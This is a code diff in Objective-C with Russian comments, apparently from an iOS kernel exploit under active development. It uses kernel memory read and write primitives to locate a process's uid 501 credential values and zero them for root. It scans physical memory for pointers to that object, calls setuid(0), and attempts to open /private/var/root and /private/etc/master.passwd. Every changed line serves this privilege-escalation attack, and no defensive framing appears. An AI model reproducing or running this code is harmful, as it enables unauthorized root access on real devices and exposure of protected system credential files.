@@ -2657,31 +2657,75 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         if (nHit == 0) {
             kpNote(r, @"  [W501] writable uid-зеркала НЕТ — кластер 501 только в RO (0x18)");
         } else if (firstHitVA) {
-            // 2.0.64: пишем uid→0 в найденное зеркало, пробуем getuid/setuid
             kpNote(r, [NSString stringWithFormat:@"  [W501] WRITE-TRY va=%#llx", (unsigned long long)firstHitVA]);
-            // сохраняем 3 кворда кластера (uid/ruid/gid-зона)
-            uint64_t s0 = early_kread64(firstHitVA);
-            uint64_t s1 = early_kread64(firstHitVA + 8);
-            uint64_t s2 = early_kread64(firstHitVA + 16);
-            kpNote(r, [NSString stringWithFormat:@"  [W501] save %016llx %016llx %016llx",
-                      (unsigned long long)s0, (unsigned long long)s1, (unsigned long long)s2]);
-            early_kwrite64(firstHitVA, 0);
-            early_kwrite64(firstHitVA + 8, 0);
-            early_kwrite64(firstHitVA + 16, 0);
+            // 2.0.65: контекст объекта + указатели на таблицу
+            {
+                uint32_t hdrOff = firstHitOff >= 0x20 ? firstHitOff - 0x20 : 0;
+                NSMutableString *hdr = [NSMutableString string];
+                for (uint32_t j = 0; j < 8 && hdrOff + j * 8 < 0x4000; j++)
+                    [hdr appendFormat:@" +%x:%#018llx", hdrOff + j * 8,
+                     (unsigned long long)early_kread64((firstHitVA - firstHitOff) + hdrOff + j * 8)];
+                kpNote(r, [NSString stringWithFormat:@"  [W501] objhdr:%@", hdr]);
+                uint64_t back = kp_untag_ptr(early_kread64(firstHitVA - 0x10));
+                if (kpLooksLikeKernelPointer(back)) {
+                    NSMutableString *bd = [NSMutableString string];
+                    for (int j = 0; j < 8; j++)
+                        [bd appendFormat:@" +%x:%#018llx", j * 8, (unsigned long long)early_kread64(back + j * 8)];
+                    kpNote(r, [NSString stringWithFormat:@"  [W501] back+(-10)=%#llx :%@", (unsigned long long)back, bd]);
+                }
+            }
+            // ищем, кто держит указатель на firstHitVA (только 0x21 кадры)
+            {
+                uint64_t wB2 = kconstant(physBase), wS2 = kconstant(physSize);
+                uint32_t refHits = 0;
+                for (uint64_t pa = wB2; pa < wB2 + wS2 && refHits < 8; pa += 0x4000) {
+                    if (kpFrameTypeOf(pa) != 0x21) continue;
+                    uint64_t al = phystokv(pa);
+                    if (!al) continue;
+                    for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
+                        uint64_t q = kp_untag_ptr(early_kread64(al + o));
+                        if (q == firstHitVA) {
+                            refHits++;
+                            kpNote(r, [NSString stringWithFormat:@"  [W501] REF ★ %#llx+%#x → table",
+                                      (unsigned long long)(al + o), o]);
+                        }
+                    }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [W501] refs=%u", refHits]);
+            }
+            // пишем ВСЕ хиты на странице → 0, пробуем getuid + open системного файла
+            uint64_t saved[16]; int nSaved = 0;
+            uint64_t pageBase = firstHitVA - firstHitOff;
+            for (uint32_t o = 0; o + 8 <= 0x4000 && nSaved < 16; o += 8) {
+                uint64_t q = early_kread64(pageBase + o);
+                if (q == 0x000001f5000001f5ULL) {
+                    saved[nSaved++] = q;
+                    early_kwrite64(pageBase + o, 0);
+                }
+            }
             uint64_t r0 = early_kread64(firstHitVA);
             uid_t u1 = getuid(), e1 = geteuid();
             int su = setuid(0);
             uid_t u2 = getuid(), e2 = geteuid();
-            kpNote(r, [NSString stringWithFormat:@"  [W501] after write readback=%016llx setuid0=%d uid %u→%u euid %u→%u",
-                      (unsigned long long)r0, su, u1, u2, e1, e2]);
+            int fdR = open("/private/var/root", O_RDONLY);
+            int eOpen = errno;
+            int fdM = open("/private/etc/master.passwd", O_RDONLY);
+            int eM = errno;
+            kpNote(r, [NSString stringWithFormat:@"  [W501] after write n=%d readback=%016llx setuid0=%d uid %u→%u euid %u→%u open/root=%d/e%d master=%d/e%d",
+                      nSaved, (unsigned long long)r0, su, u1, u2, e1, e2, fdR, eOpen, fdM, eM]);
+            if (fdR >= 0) close(fdR);
+            if (fdM >= 0) close(fdM);
             if (u2 == 0 || e2 == 0) {
                 kpNote(r, @"=== UID-0 WIN ★★★ ===");
             } else {
-                // restore
-                early_kwrite64(firstHitVA, s0);
-                early_kwrite64(firstHitVA + 8, s1);
-                early_kwrite64(firstHitVA + 16, s2);
-                kpNote(r, @"  [W501] restored — getuid не увидел 0, зеркало не то что читает getuid");
+                // restore все
+                int ri = 0;
+                for (uint32_t o = 0; o + 8 <= 0x4000 && ri < nSaved; o += 8) {
+                    if (early_kread64(pageBase + o) == 0) {
+                        early_kwrite64(pageBase + o, saved[ri++]);
+                    }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [W501] restored %d — getuid не увидел 0", ri]);
             }
         }
     }
